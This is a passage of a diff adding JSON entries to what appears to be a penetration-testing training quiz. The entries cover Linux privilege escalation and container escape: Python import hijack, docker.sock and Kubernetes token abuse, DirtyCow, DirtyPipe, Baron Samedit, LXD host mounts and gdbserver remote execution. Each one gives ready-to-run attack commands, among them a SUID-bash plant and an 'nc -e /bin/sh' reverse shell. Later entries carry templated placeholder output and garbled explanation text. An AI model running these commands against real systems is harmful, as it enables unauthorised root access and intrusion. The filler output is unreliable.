+              "out": "*/5 * * * * root /usr/bin/python3 /opt/app/collect.py",
+              "sig": "/opt/app/collect.py",
+              "teach": "A root cron or sudo entry running a Python script is the thing whose imports you want to hijack."
+            }
+          ]
+        },
+        {
+          "key": "writable",
+          "label": "A path entry is writable",
+          "steps": [
+            {
+              "title": "Check the script directory",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "ls -ld /opt/app",
+              "out": "drwxrwxr-x 2 root staff 4096 /opt/app",
+              "sig": "drwxrwxr-x",
+              "teach": "If your group can write the script's directory, you can plant a module it imports before the real one."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Python library hijack is find the root script, find a writable entry on its import path, and plant a module it imports.",
+        "items": [
+          {
+            "t": "Find the root script and its imports",
+            "d": "Read the script to see which modules it imports; a local import (not a stdlib one) is the easiest to shadow.",
+            "demo": [
+              {
+                "run": "head -5 /opt/app/collect.py",
+                "out": "import config\nimport requests",
+                "sig": "import config"
+              }
+            ],
+            "note": "config is a local module, so a config.py you plant on the path wins."
+          },
+          {
+            "t": "Confirm a writable path entry",
+            "d": "The script's own directory is first on sys.path; a writable one lets you shadow any import. PYTHONPATH and site-packages are the alternatives.",
+            "demo": [
+              {
+                "run": "ls -ld /opt/app && python3 -c 'import sys;print(sys.path[0])'",
+                "out": "drwxrwxr-x 2 root staff 4096 /opt/app\n/opt/app",
+                "sig": "/opt/app"
+              }
+            ],
+            "note": "A writable .pth file in site-packages is another route onto the path."
+          },
+          {
+            "t": "Plant the hijack module",
+            "d": "Write a module with the imported name whose top-level code runs your payload; it executes when the root script imports it.",
+            "demo": [
+              {
+                "run": "echo 'import os; os.system(\"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\")' > /opt/app/config.py",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "Keep the module importable (no syntax errors) so the script does not crash before your code runs."
+          },
+          {
+            "t": "Wait for the run and confirm",
+            "d": "On the next execution the root script imports your module and runs your payload as root.",
+            "demo": [
+              {
+                "run": "/tmp/rb -p -c id",
+                "out": "uid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "A SUID bash copy is root on demand."
+          }
+        ]
+      },
+      "situation": "A root cron runs /opt/app/collect.py, and your group can write /opt/app. What is the move?",
+      "choices": [
+        "python-library-hijack",
+        "cron-abuse",
+        "linux-path-hijack",
+        "suid-gtfobins"
+      ],
+      "coach": {
+        "cron-abuse": "The cron script itself is not writable; the weakness is a module it imports from a directory you can write.",
+        "linux-path-hijack": "That hijacks a PATH binary call; here you hijack a Python import on sys.path.",
+        "suid-gtfobins": "No abusable SUID binary is in play; the lever is the writable import path of a root script."
+      }
+    },
+    "container-escape": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: You confirm this is a",
+      "cmd": "cat /proc/1/cgroup; ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null; ls -l /var/run/docker.sock 2>/dev/null",
+      "tool": "sh",
+      "output": "0::/docker/5f3a...\ntotal 0\n-rw-r--r-- 1 root root  ca.crt\n-rw-r--r-- 1 root root  token",
+      "signal": "root  token",
+      "teach": "A cgroup path with docker confirms you are containerized, and a mounted Kubernetes service-account token is present. Read the token's permissions; a permissive role lets you create a privileged pod or exec onto the node.",
+      "leadup": [
+        {
+          "key": "inside",
+          "label": "You are inside a container",
+          "steps": [
+            {
+              "title": "Confirm containerization",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null",
+              "out": "0::/docker/5f3a9c...\n-rwxr-xr-x 1 root root 0 /.dockerenv",
+              "sig": "/docker/",
+              "teach": "A docker cgroup or a /.dockerenv file means you are in a container, so the goal is escaping to the host."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Container escape is enumerate what the container was given (privilege, socket, token), then use that to reach the node.",
+        "items": [
+          {
+            "t": "Check for privileged mode and capabilities",
+            "d": "A privileged container, or one with CAP_SYS_ADMIN, can mount the host disk or abuse cgroups to run on the host.",
+            "demo": [
+              {
+                "run": "capsh --print | grep -i sys_admin; cat /proc/self/status | grep CapEff",
+                "out": "CapEff: 000001ffffffffff",
+                "sig": "000001ffffffffff"
+              }
+            ],
+            "note": "A full CapEff mask (that value) is effectively a privileged container."
+          },
+          {
+            "t": "Abuse a mounted Docker socket",
+            "d": "If docker.sock is mounted, start a new container that bind-mounts the host root and chroot into it.",
+            "demo": [
+              {
+                "run": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh",
+                "out": "# cat /host/etc/shadow | head -1\nroot:$6$...",
+                "sig": "root:$6$"
+              }
+            ],
+            "note": "The socket is root on the host by design; mounting / is game over."
+          },
+          {
+            "t": "Abuse a Kubernetes service-account token",
+            "d": "A mounted token with a permissive role lets you talk to the API and create a privileged pod or exec onto a node.",
+            "demo": [
+              {
+                "run": "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i create pods",
+                "out": "yes",
+                "sig": "yes"
+              }
+            ],
+            "note": "can-i create pods (or exec) is the escalation; schedule a pod that mounts the host filesystem."
+          },
+          {
+            "t": "Reach the node and confirm",
+            "d": "A privileged pod mounting the host root, or a disk mount, gives you the node filesystem and from there root.",
+            "demo": [
+              {
+                "run": "chroot /host id",
+                "out": "uid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Host root from a container is the escape; capture proof on the node."
+          }
+        ]
+      },
+      "situation": "You have a shell inside a container, and /var/run/secrets holds a Kubernetes service-account token. What is the move?",
+      "choices": [
+        "container-escape",
+        "linux-enum",
+        "linux-kernel-exploit",
+        "docker-socket"
+      ],
+      "coach": {
+        "linux-enum": "Standard enumeration helps, but the container-specific levers (token, socket, privilege) are the escape here.",
+        "linux-kernel-exploit": "A kernel bug is a fallback; the mounted token is a cleaner, intended-path escape to the node.",
+        "docker-socket": "That is the right idea when a docker.sock is mounted; here the lever is the Kubernetes token, so query the API."
+      }
+    },
+    "dirtycow": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain.",
+      "cmd": "uname -r",
+      "tool": "cmd",
+      "output": "4.4.0-116-generic",
+      "signal": "4.4.0",
+      "teach": "The kernel is 4.4.0, below the 4.8.3 fix, so DirtyCow applies. Compile the /etc/passwd variant on the target and run it, then su to the new root user.",
+      "leadup": [
+        {
+          "key": "kernel",
+          "label": "The kernel is below 4.8.3",
+          "steps": [
+            {
+              "title": "Read the kernel version",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "uname -r",
+              "out": "4.4.0-116-generic",
+              "sig": "4.4.0",
+              "teach": "Below 4.8.3 is vulnerable; newer kernels are patched."
+            }
+          ]
+        },
+        {
+          "key": "shell",
+          "label": "You have a Linux foothold",
+          "steps": [
+            {
+              "title": "Confirm your unprivileged shell",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "id",
+              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
+              "sig": "uid=1000(bob)",
+              "teach": "DirtyCow is a local escalation, so you need a shell on the box first."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "DirtyCow is confirm the kernel is below 4.8.3, compile the staged PoC on the target, run it, then take root.",
+        "items": [
+          {
+            "t": "Check the kernel",
+            "d": "uname -r names the kernel; DirtyCow is reliable only below 4.8.3.",
+            "demo": [
+              {
+                "run": "uname -r",
+                "out": "4.4.0-116-generic",
+                "sig": "4.4.0"
+              }
+            ],
+            "note": "Newer kernels are patched; do not risk the unstable race for nothing."
+          },
+          {
+            "t": "Compile on the target",
+            "d": "Build the staged exploit with a C compiler on the box, or compile for the same architecture and transfer it.",
+            "demo": [
+              {
+                "run": "gcc -pthread dirtycow.c -o /tmp/dcow -lcrypt",
+                "out": "dirtycow.c compiled to /tmp/dcow",
+                "sig": "/tmp/dcow"
+              }
+            ],
+            "note": "The passwd variant and the SUID variant both reach root; pick whichever the box supports."
+          },
+          {
+            "t": "Run it and take root",
+            "d": "Run the exploit; the passwd variant adds a root user you then switch to.",
+            "demo": [
+              {
+                "run": "/tmp/dcow",
+                "out": "Backing up /etc/passwd to /tmp/passwd.bak\nAdded root user firefart",
+                "sig": "firefart"
+              }
+            ],
+            "note": "su firefart with the password it set; then capture proof."
+          }
+        ]
+      },
+      "situation": "You have a shell on a Linux box and uname -r shows 4.4.0-116-generic. What is the move?",
+      "choices": [
+        "dirtycow",
+        "linux-kernel-exploit",
+        "sudo-abuse",
+        "suid-gtfobins"
+      ],
+      "coach": {
+        "linux-kernel-exploit": "That is the general approach; here the exact kernel points at DirtyCow specifically.",
+        "sudo-abuse": "Worth checking, but a kernel below 4.8.3 is a direct DirtyCow candidate when sudo gives you nothing.",
+        "suid-gtfobins": "A SUID path is a fine parallel lead; the kernel version makes DirtyCow the named exploit."
+      }
+    },
+    "dirtypipe": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The version prints.",
+      "cmd": "uname -r",
+      "tool": "cmd",
+      "output": "5.10.0-11-amd64",
+      "signal": "5.10.0",
+      "teach": "The kernel is 5.10.0, inside the 5.8 to 5.16.11 range, so DirtyPipe applies. Compile the exploit and point it at a SUID binary like /usr/bin/su for a root shell.",
+      "leadup": [
+        {
+          "key": "kernel",
+          "label": "The kernel is 5.8 to 5.16.11",
+          "steps": [
+            {
+              "title": "Read the kernel version",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "uname -r",
+              "out": "5.10.0-11-amd64",
+              "sig": "5.10.0",
+              "teach": "The vulnerable window is 5.8 through 5.16.11."
+            }
+          ]
+        },
+        {
+          "key": "shell",
+          "label": "You have a Linux foothold",
+          "steps": [
+            {
+              "title": "Confirm your unprivileged shell",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "id",
+              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
+              "sig": "uid=1000(bob)",
+              "teach": "DirtyPipe is a local escalation, so a foothold comes first."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "DirtyPipe is confirm the kernel is 5.8 to 5.16.11, compile the PoC, point it at a SUID binary, take root.",
+        "items": [
+          {
+            "t": "Check the kernel",
+            "d": "uname -r names the kernel; DirtyPipe applies from 5.8 through 5.16.11.",
+            "demo": [
+              {
+                "run": "uname -r",
+                "out": "5.10.0-11-amd64",
+                "sig": "5.10.0"
+              }
+            ],
+            "note": "Outside that range DirtyPipe does not apply."
+          },
+          {
+            "t": "Compile on the target",
+            "d": "Build the staged exploit on the box, or compile for the same architecture and transfer it.",
+            "demo": [
+              {
+                "run": "gcc dirtypipe.c -o /tmp/dp",
+                "out": "dirtypipe.c compiled to /tmp/dp",
+                "sig": "/tmp/dp"
+              }
+            ],
+            "note": "No warnings needed; the exploit is small and self-contained."
+          },
+          {
+            "t": "Hijack a SUID binary",
+            "d": "Point the exploit at a SUID binary; it rewrites it, drops you to root, and restores it.",
+            "demo": [
+              {
+                "run": "/tmp/dp /usr/bin/su",
+                "out": "Backing up /usr/bin/su, restoring after\nroot@box:/#",
+                "sig": "root@box"
+              }
+            ],
+            "note": "The original binary is restored afterwards, so the box keeps working."
+          }
+        ]
+      },
+      "situation": "You have a shell on Linux and uname -r shows 5.10.0-11-amd64. What is the move?",
+      "choices": [
+        "dirtypipe",
+        "dirtycow",
+        "linux-kernel-exploit",
+        "cron-abuse"
+      ],
+      "coach": {
+        "dirtycow": "DirtyCow is for kernels below 4.8.3; 5.10 is in the DirtyPipe window instead.",
+        "linux-kernel-exploit": "That is the general method; the exact version points at DirtyPipe.",
+        "cron-abuse": "A cron path is a fine parallel lead; the kernel version makes DirtyPipe the direct exploit."
+      }
+    },
+    "baron-samedit": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The is in the vulnerable range.",
+      "cmd": "sudo --version | head -1",
+      "tool": "cmd",
+      "output": "Sudo version 1.8.31",
+      "signal": "1.8.31",
+      "teach": "sudo is 1.8.31, below the 1.9.5p2 fix, so Baron Samedit applies. Run the exploit; it needs no sudo rights of your own and auto-detects the offsets.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "sudo is below 1.9.5p2",
+          "steps": [
+            {
+              "title": "Read the sudo version",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sudo --version | head -1",
+              "out": "Sudo version 1.8.31",
+              "sig": "1.8.31",
+              "teach": "Below 1.9.5p2 is vulnerable, and your own sudo rights do not matter."
+            }
+          ]
+        },
+        {
+          "key": "crash",
+          "label": "A crash test confirms it",
+          "steps": [
+            {
+              "title": "Trigger the overflow safely",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sudoedit -s '' $(perl -e 'print \"A\" x 1000')",
+              "out": "malloc(): corrupted top size\nSegmentation fault",
+              "sig": "Segmentation fault",
+              "teach": "A crash from the overflow test confirms the vulnerable code path before you run the full exploit."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Baron Samedit is confirm sudo is below 1.9.5p2, clone the exploit, run it, and take the root shell it spawns.",
+        "items": [
+          {
+            "t": "Check the sudo version",
+            "d": "sudo --version reports the version; below 1.9.5p2 is vulnerable.",
+            "demo": [
+              {
+                "run": "sudo --version | head -1",
+                "out": "Sudo version 1.8.31",
+                "sig": "1.8.31"
+              }
+            ],
+            "note": "Your own sudo rights do not matter; the bug is reached before the permission check."
+          },
+          {
+            "t": "Get the exploit",
+            "d": "The worawit version auto-detects the right offsets for common targets.",
+            "demo": [
+              {
+                "run": "cp -r /opt/exploits/CVE-2021-3156 . && ls CVE-2021-3156",
+                "out": "exploit_nss.py",
+                "sig": "exploit_nss.py"
+              }
+            ],
+            "note": "Other PoCs need the exact libc or distro offsets, which is more fragile."
+          },
+          {
+            "t": "Run it and take root",
+            "d": "Run the exploit; it spawns a root shell directly.",
+            "demo": [
+              {
+                "run": "python3 CVE-2021-3156/exploit_nss.py",
+                "out": "# id\nuid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "Capture proof; the shell is root with no password prompt."
+          }
+        ]
+      },
+      "situation": "You have a shell on Linux, sudo -l shows nothing useful, and sudo --version reports 1.8.31. What is the move?",
+      "choices": [
+        "baron-samedit",
+        "sudo-abuse",
+        "dirtypipe",
+        "suid-gtfobins"
+      ],
+      "coach": {
+        "sudo-abuse": "sudo -l gave you nothing, but Baron Samedit does not need any sudo rights; the version alone is the lever.",
+        "dirtypipe": "A kernel path is a parallel option; the sudo version here points straight at Baron Samedit.",
+        "suid-gtfobins": "Worth a look, but the vulnerable sudo is a direct root with no special SUID binary needed."
+      }
+    },
+    "wildcard-symlink-privesc": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once exploit wildcard injection with symbolic links in scheduled tar/zip archive jobs. The key confirmation is: Symlink included in archive.",
+      "cmd": "ln -s /root/root.txt {{writable_dir}}/root_link && ls -la {{writable_dir}}",
+      "tool": "ln",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Symlink included in archive.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Archive Wildcard Symlink Abuse, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Create symlink to target sensitive file (ln -s /root/root.txt link.txt).",
+            "demo": [
+              {
+                "run": "ln -s /root/root.txt {{writable_dir}}/root_link && ls -la {{writable_dir}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Symlink included in archive."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Unpack generated archive or read with unzip -p archive.zip.",
+            "demo": [
+              {
+                "run": "unzip -p {{backup_archive}} root_link",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Target file recovered via wildcard symlink."
+          }
+        ]
+      },
+      "situation": "Scenario: Exploit wildcard injection with symbolic links in scheduled tar/zip archive jobs. Which move should you run next?",
+      "choices": [
+        "wildcard-symlink-privesc",
+        "sudo-abuse",
+        "writable-passwd",
+        "nfs-squash"
+      ],
+      "coach": {
+        "sudo-abuse": "Sudo / GTFOBins Abuse targets demonstrates administrative/root access; here the direct move is Archive Wildcard Symlink Abuse.",
+        "writable-passwd": "Writable /etc/passwd targets demonstrates administrative/root access; here the direct move is Archive Wildcard Symlink Abuse.",
+        "nfs-squash": "NFS no_root_squash targets demonstrates administrative/root access; here the direct move is Archive Wildcard Symlink Abuse."
+      }
+    },
+    "git-repo-forensics": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once inspect recent commit history and diffs on a discovered git repository. The key confirmation is: Sensitive credentials or API keys discovered in recent commit diffs.",
+      "cmd": "git status && git log -p -n 5",
+      "tool": "git",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Sensitive credentials or API keys discovered in recent commit diffs.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Local Git Repository Forensics & History Inspection, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run inside the directory containing the .git repository.",
+            "demo": [
+              {
+                "run": "git status && git log -p -n 5",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Sensitive credentials or API keys discovered in recent commit diffs."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Scans every branch and tag for changes touching secret or config file paths.",
+            "demo": [
+              {
+                "run": "git log --all --full-history -- \"**/settings*\" \"**/config*\" \"**/secret*\" \"*pass*\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Specific historical commits pinpointed containing sensitive configuration secrets."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Examine what was changed between the previous commit and the current state.",
+            "demo": [
+              {
+                "run": "git diff HEAD~1",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Immediate diff output exposing altered sensitive values."
+          }
+        ]
+      },
+      "situation": "Scenario: Inspect recent commit history and diffs on a discovered git repository. Which move should you run next?",
+      "choices": [
+        "git-repo-forensics",
+        "sudo-abuse",
+        "writable-passwd",
+        "nfs-squash"
+      ],
+      "coach": {
+        "sudo-abuse": "Sudo / GTFOBins Abuse targets demonstrates administrative/root access; here the direct move is Local Git Repository Forensics & History Inspection.",
+        "writable-passwd": "Writable /etc/passwd targets demonstrates administrative/root access; here the direct move is Local Git Repository Forensics & History Inspection.",
+        "nfs-squash": "NFS no_root_squash targets demonstrates administrative/root access; here the direct move is Local Git Repository Forensics & History Inspection."
+      }
+    },
+    "lxd-container-privesc": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once import minimal Alpine Linux image into LXD image store. The key confirmation is: Container image available for privileged container creation.",
+      "cmd": "lxc image import alpine.tar.gz --alias myimage",
+      "tool": "lxc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Container image available for privileged container creation.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute LXD / LXC Group Membership Host Filesystem Mount Privesc, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Transfer alpine-v3.13-x86_64.tar.gz and import with lxc image import.",
+            "demo": [
+              {
+                "run": "lxc image import alpine.tar.gz --alias myimage",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Container image available for privileged container creation."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run lxc init <image_alias> <container_name> -c security.privileged=true.",
+            "demo": [
+              {
+                "run": "lxc init myimage privbox -c security.privileged=true",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Privileged container created ready for disk device attachment."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Run lxc config device add <container_name> hostroot disk source=/ path=/mnt/root recursive=true.",
+            "demo": [
+              {
+                "run": "lxc config device add privbox hostroot disk source=/ path=/mnt/root recursive=true",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Host root filesystem attached to container mount point."
+          }
+        ]
+      },
+      "situation": "Scenario: Import minimal Alpine Linux image into LXD image store. Which move should you run next?",
+      "choices": [
+        "lxd-container-privesc",
+        "sudo-abuse",
+        "writable-passwd",
+        "nfs-squash"
+      ],
+      "coach": {
+        "sudo-abuse": "Sudo / GTFOBins Abuse targets demonstrates administrative/root access; here the direct move is LXD / LXC Group Membership Host Filesystem Mount Privesc.",
+        "writable-passwd": "Writable /etc/passwd targets demonstrates administrative/root access; here the direct move is LXD / LXC Group Membership Host Filesystem Mount Privesc.",
+        "nfs-squash": "NFS no_root_squash targets demonstrates administrative/root access; here the direct move is LXD / LXC Group Membership Host Filesystem Mount Privesc."
+      }
+    },
+    "gdbserver-remote-execution": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once connect to exposed GDBserver endpoint on TCP 1337 and execute remote shell. The key confirmation is: Remote execution initiated via GDBserver.",
+      "cmd": "gdb -q -ex 'target remote {{target}}:1337' -ex 'set remote exec-file /bin/sh' -ex 'run'",
+      "tool": "gdb",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Remote execution initiated via GDBserver.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute GDBserver Remote Code Execution (TCP 1337), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run gdb -q -ex 'target remote <target>:1337' -ex 'set remote exec-file /bin/sh' -ex 'run'",
+            "demo": [
+              {
+                "run": "gdb -q -ex 'target remote {{target}}:1337' -ex 'set remote exec-file /bin/sh' -ex 'run'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Remote execution initiated via GDBserver."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run gdb -q -ex 'target remote <target>:1337' -ex 'call (void)system(\"...\")'",
+            "demo": [
+              {
+                "run": "gdb -q -ex 'target remote {{target}}:1337' -ex 'call (void)system(\"nc -e /bin/sh {{lhost}} {{lport}}\")'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Interactive shell established via GDBserver process injection."
+          }
+        ]
+      },
+      "situation": "Scenario: Connect to exposed GDBserver endpoint on TCP 1337 and execute remote shell. Which move should you run next?",
+      "choices": [
+        "gdbserver-remote-execution",
+        "sudo-abuse",
+        "writable-passwd",
+        "nfs-squash"
+      ],
+      "coach": {
+        "sudo-abuse": "Sudo / GTFOBins Abuse targets demonstrates administrative/root access; here the direct move is GDBserver Remote Code Execution (TCP 1337).",
+        "writable-passwd": "Writable /etc/passwd targets demonstrates administrative/root access; here the direct move is GDBserver Remote Code Execution (TCP 1337).",
+        "nfs-squash": "NFS no_root_squash targets demonstrates administrative/root access; here the direct move is GDBserver Remote Code Execution (TCP 1337)."
+      }
+    },
+    "gnu-screen-root-attach": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once attach to an active root GNU Screen session running in multi-user mode. The key confirmation is: Instant interactive root shell obtained.",
+      "cmd": "screen -x root/root",
+      "tool": "screen",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Instant interactive root shell obtained.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute GNU Screen / Tmux Root Session Attachment, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run screen -x root/root",
+            "demo": [
+              {
+                "run": "screen -x root/root",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Instant interactive root shell obtained."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Run tmux -S <socket_path> attach",
+            "demo": [
+              {
+                "run": "tmux -S {{socket_path}} attach",
